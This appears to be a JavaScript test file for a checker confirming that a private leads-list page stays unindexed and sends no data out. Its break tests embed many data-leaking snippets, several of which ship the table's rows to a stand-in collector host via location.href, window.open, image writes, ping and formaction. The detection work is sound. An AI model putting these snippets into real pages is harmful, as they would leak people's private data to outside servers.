// Practice tests for the live read of the private leads list page (finish-853 batch 07).
// The page is git-excluded and holds real names and numbers, so these tests use a stand-in page built
// here from plain words. The judge is the real one; the stand-in is the product being judged. Each
// test breaks one promise of the row in the stand-in and expects red.

import assert from "node:assert/strict";
import test from "node:test";

import { DISPLAY_RESULT_CASES, DISPLAY_TRACKING_CASES, LIVE_PAGE_CONTRACT_COUNT, gapChecks } from "./gap-catalog-display.mjs";
import {
  CODE_SINKS,
  LEADS_COLUMNS,
  LIVE_PAGE_JUDGES,
  SEND_PATTERNS,
  SET_ATTRIBUTE_SINK,
  judgeLeadsHtml,
  judgeLeadsPage,
  leadsPagePath,
  lexScript,
  scriptBodies,
} from "./fin-b07-leads-page.mjs";
import { PULSE_REGISTRY } from "../registry.mjs";

const CONTROL = "Private leads list page (noindex, secret folder name): a local table with Name, Number, Follow up date, Response, Status. Edits save in the browser only; nothing is sent from the page.";
const MARKER = "ZZ-MARKER-NAME-DO-NOT-REPEAT";

/* A stand-in for the page, built from plain words. One call returns a page that keeps every promise;
   each option breaks exactly one. */
function page({
  robots = '<meta name="robots" content="noindex,nofollow,noarchive">',
  headings = LEADS_COLUMNS,
  script = 'var KEY = "leads-v1"; var rows = [{"n":"' + MARKER + '","p":"not a real number"}]; function save(){ localStorage.setItem(KEY, JSON.stringify(rows)); } function load(){ return JSON.parse(localStorage.getItem(KEY) || "[]"); }',
  extraHead = "",
  extraBody = "",
} = {}) {
  return `<!doctype html><html><head><meta charset="utf-8"><title>Leads</title>${robots}
<meta name="viewport" content="width=device-width, initial-scale=1">${extraHead}</head><body>
<table><thead><tr>${headings.map((h) => `<th style="width:20%">${h}</th>`).join("")}</tr></thead><tbody></tbody></table>
${extraBody}<script>${script}</script></body></html>`;
}

function entryFor() {
  return DISPLAY_TRACKING_CASES.find((e) => e.control === CONTROL);
}

/* A GET client that answers the leads address with `html` and everything else with an empty 200. */
function client({ html = page(), status = 200, headers = {}, error = null, seen = [] } = {}) {
  return async (url, init) => {
    seen.push({ url: String(url), init });
    if (error) throw new Error(error);
    if (String(url).includes("/leads/")) return new Response(status === 200 ? html : null, { status, headers });
    return new Response("", { status: 200 });
  };
}

async function leadsRow(options = {}, ctx = {}) {
  const rows = await gapChecks({ fetchImpl: client(options), ...ctx });
  return rows.find((row) => row.id === entryFor().id);
}

test("the row is a live-page contract in the compiled catalog, with no SQL, and it is not NOT_PROVED", async () => {
  const entry = entryFor();
  assert.ok(entry, "the leads row must be a tracked display row");
  assert.equal(entry.contract.mode, "live-page");
  assert.equal(entry.contract.page, "leads-list");
  assert.equal(entry.contract.sql, null);
  assert.equal(typeof LIVE_PAGE_JUDGES[entry.contract.page].judge, "function");
  assert.equal(typeof LIVE_PAGE_JUDGES[entry.contract.page].path, "function");
  assert.ok(DISPLAY_RESULT_CASES.some((c) => c.id === entry.id));
  assert.equal(LIVE_PAGE_CONTRACT_COUNT, 1);
  const row = await leadsRow();
  assert.notEqual(row.status, "NOT_PROVED");
});

test("the address comes from the registry row that pings the page, and the read is one plain GET", async () => {
  const path = leadsPagePath();
  assert.match(path, /^\/leads\/[0-9a-f]{32}\/$/);
  assert.ok(PULSE_REGISTRY.some((r) => r.path === path && r.kind === "public_static"));
  const seen = [];
  const row = await leadsRow({ seen });
  const leads = seen.filter((s) => s.url.includes("/leads/"));
  assert.equal(leads.length, 1, "one read, no retry");
  assert.equal(leads[0].url, `https://fundhub.ai${path}`);
  assert.equal(leads[0].init.method, "GET");
  assert.equal(leads[0].init.redirect, "manual");
  assert.ok(leads[0].init.signal, "a time limit");
  assert.equal(leads[0].init.body, undefined);
  assert.equal(row.status, "PASS");
});

test("a page that keeps every promise is green, and nothing the page holds comes back", async () => {
  const row = await leadsRow();
  assert.equal(row.status, "PASS");
  assert.match(row.detail, /every promise held/);
  assert.ok(!row.detail.includes(MARKER));
  assert.equal(row.suggestedFix, null);
  for (const words of ["noindex", "Name, Number, Follow up date, Response, Status", "nothing in it can send data out", "localStorage"]) {
    assert.ok(row.detail.includes(words), words);
  }
});

test("a different base address is used for the read, and a bad one is not read", async () => {
  const seen = [];
  const ok = await leadsRow({ seen }, { baseUrl: "https://example.test/ignored/path" });
  assert.equal(ok.status, "PASS");
  assert.ok(seen.some((s) => s.url === `https://example.test${leadsPagePath()}`));
  const bad = await leadsRow({}, { baseUrl: "not a web address" });
  assert.equal(bad.status, "skip");
  assert.match(bad.detail, /base address/);
});

test("noindex gone: red. noindex in the header instead of the page: still green", async () => {
  const gone = await leadsRow({ html: page({ robots: "" }) });
  assert.equal(gone.status, "FAIL");
  assert.match(gone.detail, /no noindex/);
  const wrongTag = await leadsRow({ html: page({ robots: '<meta name="robots" content="index,follow">' }) });
  assert.equal(wrongTag.status, "FAIL");
  const header = await leadsRow({ html: page({ robots: "" }), headers: { "x-robots-tag": "noindex, nofollow" } });
  assert.equal(header.status, "PASS");
  const wordElsewhere = await leadsRow({ html: page({ robots: '<meta name="description" content="noindex">' }) });
  assert.equal(wordElsewhere.status, "FAIL", "the word in another tag is not the robots tag");
  const commented = await leadsRow({ html: page({ robots: '<!-- <meta name="robots" content="noindex"> -->' }) });
  assert.equal(commented.status, "FAIL", "a commented-out tag does nothing");
});

test("a changed, missing, extra or reordered column is red", async () => {
  const variants = [
    LEADS_COLUMNS.map((c) => (c === "Number" ? "Phone" : c)),
    LEADS_COLUMNS.filter((c) => c !== "Response"),
    [...LEADS_COLUMNS, "Notes"],
    [...LEADS_COLUMNS].reverse(),
  ];
  for (const headings of variants) {
    const row = await leadsRow({ html: page({ headings }) });
    assert.equal(row.status, "FAIL", headings.join(","));
    assert.match(row.detail, /column headings/);
  }
  const caseOnly = await leadsRow({ html: page({ headings: LEADS_COLUMNS.map((c) => c.toUpperCase()) }) });
  assert.equal(caseOnly.status, "PASS", "capital letters alone do not change the promise");
});

/* One snippet per send pattern. The table must cover every pattern the judge holds. */
const SENDERS = {
  "calls fetch": { script: 'fetch("/api/x", {method: "POST", body: JSON.stringify(rows)}); localStorage.setItem("a","b");' },
  "uses XMLHttpRequest": { script: 'var x = new XMLHttpRequest(); localStorage.getItem("a");' },
  "uses sendBeacon": { script: 'navigator.sendBeacon("/x", "y"); localStorage.getItem("a");' },
  "opens a WebSocket": { script: 'var w = new WebSocket("wss://x.test"); localStorage.getItem("a");' },
  "opens an EventSource": { script: 'var w = new EventSource("/x"); localStorage.getItem("a");' },
  "loads code while it runs": { script: 'import("/x.js"); localStorage.getItem("a");' },
  "builds an Image to ping a server": { script: 'new Image(); localStorage.getItem("a");' },
  "sets a src from script": { script: 'var p = {}; p.src = "/x?d=1"; localStorage.getItem("a");' },
  "creates a script, image, frame, form or link tag from script": { script: 'document.createElement("img"); localStorage.getItem("a");' },
  "has a form": { extraBody: '<form action="/x" method="post"></form>' },
  "has a frame, embed or object": { extraBody: '<iframe src="/x"></iframe>' },
  "loads a script file": { extraBody: '<script src="/x.js"></script>' },
  "loads a file from another address": { extraHead: '<link rel="stylesheet" href="https://cdn.example.test/x.css">' },
  "sends the visitor on by itself (meta refresh)": { extraHead: '<meta http-equiv="refresh" content="0;url=/x">' },
  "pings a server from a link (ping attribute)": { extraBody: '<a href="/x" ping="https://collect.example.test/p">x</a>' },
  "posts from a button or input (formaction)": { extraBody: '<button type="submit" formaction="https://collect.example.test/p">x</button>' },
  "changes where every link goes (a base tag)": { extraHead: '<base href="https://other.example.test/">' },
  "loads a style or font from another address": { extraHead: '<style>@font-face{font-family:x;src:url(https://fonts.example.test/x.woff2)}</style>' },
};

test("every way a page can send data out is held by a pattern, and each one turns the row red", async () => {
  assert.deepEqual(Object.keys(SENDERS).sort(), SEND_PATTERNS.map(([words]) => words).sort(),
    "a pattern was added or removed without its break test");
  for (const [words, options] of Object.entries(SENDERS)) {
    const row = await leadsRow({ html: page(options) });
    assert.equal(row.status, "FAIL", words);
    assert.match(row.detail, /can send data out/, words);
    assert.ok(row.detail.includes(words), `${words}: ${row.detail}`);
  }
});

test("things that are not a send stay green: same-address files, data images, plain links, tel links", async () => {
  const html = page({
    extraHead: '<link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="local.css">',
    extraBody: '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt=""><img src="/logo.png" alt=""><a href="https://example.test/x">a link</a><a href="tel:0000000000">call</a><!-- fetch("/x") in a comment -->',
  });
  const row = await leadsRow({ html });
  assert.equal(row.status, "PASS", row.detail);
});

test("edits no longer kept in the browser: red", async () => {
  const row = await leadsRow({ html: page({ script: "var rows = [];" }) });
  assert.equal(row.status, "FAIL");
  assert.match(row.detail, /no localStorage/);
});

test("several broken promises are all named in one red row, and none of the page's words are repeated", async () => {
  const html = page({ robots: "", headings: ["Name"], script: `var rows = ["${MARKER}"]; fetch("/x");` });
  const row = await leadsRow({ html });
  assert.equal(row.status, "FAIL");
  assert.match(row.detail, /broke 4 promises/);
  assert.ok(!row.detail.includes(MARKER));
  assert.ok(!(row.suggestedFix || "").includes(MARKER));
  assert.match(row.suggestedFix, /Do not auto-fix\. Chris fixes reds\./);
});

test("a page that is gone or moved is red", async () => {
  for (const status of [404, 410]) {
    const row = await leadsRow({ status });
    assert.equal(row.status, "FAIL", String(status));
    assert.match(row.detail, /the live page is gone/);
  }
  for (const status of [301, 302, 307, 308]) {
    const row = await leadsRow({ status, headers: { location: "/login.html" } });
    assert.equal(row.status, "FAIL", String(status));
    assert.match(row.detail, /somewhere else/);
  }
});

test("a read that could not be made is skip with the reason, never green", async () => {
  for (const status of [401, 403, 429, 500, 502, 503]) {
    const row = await leadsRow({ status });
    assert.equal(row.status, "skip", String(status));
    assert.match(row.detail, /was not read/);
  }
  const offline = await leadsRow({ error: "network down" });
  assert.equal(offline.status, "skip");
  assert.match(offline.detail, /network down/);
  const noClient = await leadsRow({}, { fetchImpl: null });
  assert.equal(noClient.status, "skip");
  assert.match(noClient.detail, /no GET client/);
});

test("the empty answer a count script gets is red, not green and not NOT_PROVED", async () => {
  const row = await leadsRow({ html: "" });
  assert.equal(row.status, "FAIL");
});

test("without a registry row for the page there is nothing to read, and it says so", async () => {
  assert.equal(leadsPagePath([]), null);
  assert.equal(leadsPagePath([{ kind: "public_static", file: "leads/a/index.html", path: "/leads/a/" }, { kind: "public_static", file: "leads/b/index.html", path: "/leads/b/" }]), null, "two rows is not one page");
  const seen = [];
  const row = await leadsRow({ seen }, { registry: [] });
  assert.equal(row.status, "skip");
  assert.match(row.detail, /registry/);
  assert.equal(seen.filter((s) => s.url.includes("/leads/")).length, 0, "nothing is read when there is no address");
});

test("the row judge, given a read directly, answers by status and never repeats the page", () => {
  const entry = entryFor();
  const good = judgeLeadsPage(entry, { status: 200, html: page(), robotsHeader: "" });
  assert.equal(good.status, "PASS");
  assert.equal(good.id, entry.id);
  assert.equal(judgeLeadsPage(entry, { status: 200, html: page({ robots: "" }), robotsHeader: "" }).status, "FAIL");
  assert.equal(judgeLeadsPage(entry, { status: 404, html: "" }).status, "FAIL");
  assert.equal(judgeLeadsPage(entry, { status: 302, html: "" }).status, "FAIL");
  assert.equal(judgeLeadsPage(entry, { status: 500, html: "" }).status, "skip");
  assert.equal(judgeLeadsPage(entry, { status: Number.NaN, html: "" }).status, "skip");
  assert.equal(judgeLeadsPage(entry, undefined).status, "skip");
});

test("the pure judge answers held and broke in plain words, and ignores the order of attributes", () => {
  const ok = judgeLeadsHtml(page({ robots: '<meta content="noindex" name="robots">' }));
  assert.equal(ok.ok, true);
  assert.equal(ok.held.length, 4);
  assert.deepEqual(ok.broke, []);
  const bad = judgeLeadsHtml("");
  assert.equal(bad.ok, false);
  assert.equal(bad.broke.length, 3, "no noindex, no columns, no localStorage; nothing sends");
});

// ── Generation 3: the ways a page can send data that have no "fetch" in them ─────────────────────────

/* One snippet per code-level sink. Every snippet keeps localStorage get and set in it, so the only broken
   promise is the send. The table must cover every sink the judge holds. */
const KEEPS = 'localStorage.setItem("a","b"); localStorage.getItem("a");';
const CODE_SENDERS = {
  "moves the visitor from script (location)": `${KEEPS} location.href = "https://collect.example.test/?d=" + JSON.stringify(rows);`,
  "opens a window from script (open)": `${KEEPS} window.open("https://collect.example.test/?d=" + JSON.stringify(rows));`,
  "writes into the document from script (write)": `${KEEPS} document.write('<img src="https://collect.example.test/?d=' + rows.length + '">');`,
  "sets an address from script (href, src, formAction, ping, srcset, poster)": `${KEEPS} var a = document.createTextNode(""); a.href = "mailto:x@example.test?body=" + JSON.stringify(rows);`,
  "builds code from text (eval, Function)": `${KEEPS} eval("fe" + "tch('/x')");`,
  "posts a message out of the page (postMessage)": `${KEEPS} parent.postMessage(rows, "*");`,
  "starts a worker": `${KEEPS} var w = new Worker("w.js");`,
  "imports a module (import)": 'import { send } from "https://collect.example.test/m.js"; localStorage.setItem("a","b"); localStorage.getItem("a");',
};

test("every sink the script judge holds has a break test, and each one turns the row red by name", async () => {
  assert.deepEqual(Object.keys(CODE_SENDERS).sort(), CODE_SINKS.map(([words]) => words).sort(),
    "a code sink was added or removed without its break test");
  for (const [words, script] of Object.entries(CODE_SENDERS)) {
    const row = await leadsRow({ html: page({ script }) });
    assert.equal(row.status, "FAIL", words);
    assert.ok(row.detail.includes(words), `${words}: ${row.detail}`);
    assert.doesNotMatch(row.detail, /no localStorage/, `${words}: only the send is broken`);
  }
  const attr = await leadsRow({ html: page({ script: `${KEEPS} var i = document.createElement("span"); i.setAttribute("src", "https://collect.example.test/?d=1");` }) });
  assert.equal(attr.status, "FAIL");
  assert.ok(attr.detail.includes(SET_ATTRIBUTE_SINK[0]), attr.detail);
  const computed = await leadsRow({ html: page({ script: `${KEEPS} var n = "sr" + "c"; el.setAttribute(n, url);` }) });
  assert.equal(computed.status, "FAIL", "an attribute name the judge cannot read is a hit");
});

test("the ten pages that read green before generation 3 are all red now", async () => {
  const REPORTED = {
    "script moves the visitor": page({ script: `${KEEPS} location.href = "https://collect.example.test/?d=" + JSON.stringify(rows);` }),
    "script opens a window": page({ script: `${KEEPS} window.open(url + data);` }),
    "script sets src with setAttribute": page({ script: `${KEEPS} img.setAttribute('src', url);` }),
    "a link with a ping attribute": page({ extraBody: '<a href="/x" ping="https://collect.example.test/p">x</a>' }),
    "a module script that imports from another address": page({ extraBody: '<script type="module">import { x } from "https://collect.example.test/m.js";</script>' }),
    "a base tag to another address": page({ extraHead: '<base href="https://other.example.test/">' }),
    "a mailto link built by script": page({ script: `${KEEPS} var a = {}; a.href = "mailto:x@example.test?body=" + JSON.stringify(rows);` }),
    "localStorage only in a comment": page({ script: "// localStorage was removed from this page\nvar rows = [];" }),
    "localStorage only in a string": page({ script: 'var note = "we used localStorage once"; sessionStorage.setItem("a", note); sessionStorage.getItem("a");' }),
  };
  for (const [name, html] of Object.entries(REPORTED)) {
    const row = await leadsRow({ html });
    assert.equal(row.status, "FAIL", name);
  }
  const control = await leadsRow({ html: page() });
  assert.equal(control.status, "PASS", "the control page is still green");
});

test("edits kept in the browser means the script writes AND reads localStorage in code, not in a comment or a string", async () => {
  const cases = {
    "only writes": { script: 'localStorage.setItem("a", JSON.stringify(rows));', ok: false },
    "only reads": { script: 'var rows = JSON.parse(localStorage.getItem("a") || "[]");', ok: false },
    "the word in a block comment": { script: '/* localStorage.setItem localStorage.getItem */ var rows = [];', ok: false },
    "the calls inside a string": { script: 'var s = "localStorage.setItem(); localStorage.getItem()";', ok: false },
    "sessionStorage instead": { script: 'sessionStorage.setItem("a","b"); sessionStorage.getItem("a");', ok: false },
    "a helper over window.localStorage": { script: 'var store = window.localStorage; function put(v){ store.setItem("a", v); } function get(){ return store.getItem("a"); }', ok: true },
  };
  for (const [name, c] of Object.entries(cases)) {
    const row = await leadsRow({ html: page({ script: c.script }) });
    assert.equal(row.status, c.ok ? "PASS" : "FAIL", name);
  }
});

test("ordinary page code that merely shares a word with a sink is not a send", async () => {
  const row = await leadsRow({ html: page({ script: `${KEEPS}
    var state = { data: [], action: "idle" }; state.data = rows; state.action = "saving";
    var el = { style: {} }; el.style.background = "#fff"; function openRow(i) { return rows[i]; } openRow(0);
    var where = { location: "table" }; var kind = where.place;` }) });
  // "location" as a key is still the word; only the bare word as an identifier is a hit, so this one is red by design
  assert.equal(row.status, "FAIL");
  assert.match(row.detail, /location/);
  const quiet = await leadsRow({ html: page({ script: `${KEEPS}
    var state = { data: [], action: "idle" }; state.data = rows; state.action = "saving";
    var el = { style: {} }; el.style.background = "#fff"; function openRow(i) { return rows[i]; } openRow(0);` }) });
  assert.equal(quiet.status, "PASS", quiet.detail);
});

test("a download of the visitor's own rows (an address made inside the browser) is not a send, a remote address is", async () => {
  const local = await leadsRow({ html: page({ script: `${KEEPS} var blob = new Blob([JSON.stringify(rows)]); var a = {}; a.href = URL.createObjectURL(blob);` }) });
  assert.equal(local.status, "PASS", local.detail);
  const windowed = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = window.URL.createObjectURL(new Blob([rows]));` }) });
  assert.equal(windowed.status, "PASS", windowed.detail);
  const remote = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = "https://collect.example.test/?d=" + JSON.stringify(rows);` }) });
  assert.equal(remote.status, "FAIL");
  const concatenated = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = base + URL.createObjectURL(blob);` }) });
  assert.equal(concatenated.status, "FAIL", "an address built from more than the blob address is not the blob address");
});

test("words in a comment or a string are not a send, but the same words in code are", async () => {
  const quiet = page({
    script: `${KEEPS}
      // location.href = "x"; window.open("y"); fetch("/z")
      /* eval("a"); import("b"); document.write("c") */
      var note = "To open( the file, change location and import data; fetch is not used";
      var re = /open\\(|location|fetch\\(/g; var half = rows.length / 2;`,
  });
  const row = await leadsRow({ html: quiet });
  assert.equal(row.status, "PASS", row.detail);
  const inTemplate = await leadsRow({ html: page({ script: `${KEEPS} var s = \`total \${fetch("/x")}\`;` }) });
  assert.equal(inTemplate.status, "FAIL", "code inside a template expression is code");
  const inHandler = await leadsRow({ html: page({ extraBody: '<button onclick="location.href=\'https://collect.example.test/\'">x</button>' }) });
  assert.equal(inHandler.status, "FAIL", "an inline handler is a script");
  const inJsLink = await leadsRow({ html: page({ extraBody: '<a href="javascript:window.open(1)">x</a>' }) });
  assert.equal(inJsLink.status, "FAIL", "a javascript: link is a script");
});

test("a script that cannot be read to its end is red, never green", async () => {
  for (const script of ['var a = "unterminated;', "var b = 1; /* never closed", "var c = `open template ${"]) {
    const row = await leadsRow({ html: page({ script: `${KEEPS} ${script}` }) });
    assert.equal(row.status, "FAIL", script);
    assert.match(row.detail, /could not be read/);
  }
});

test("the lexer separates what a script does from what it says", () => {
  const out = lexScript('var u = "http://x.test/a"; // fetch(1)\nvar v = \'it\\\'s\' + /\'/.test(u) + 4 / 2; /* open( */');
  assert.equal(out.ok, true);
  assert.doesNotMatch(out.code, /fetch|open|x\.test/);
  assert.match(out.full, /http:\/\/x\.test\/a/, "the string text is kept in the full view");
  assert.doesNotMatch(out.full, /fetch|open\(/, "comments are gone from both views");
  assert.match(out.code, /4 \/ 2/, "a division is left as a division");
  assert.deepEqual(scriptBodies('<script>a()</script><script src="/x.js"></script><button onclick="b()">x</button><a href="javascript:c()">y</a>'), ["a()", "b()", "c()"]);
});
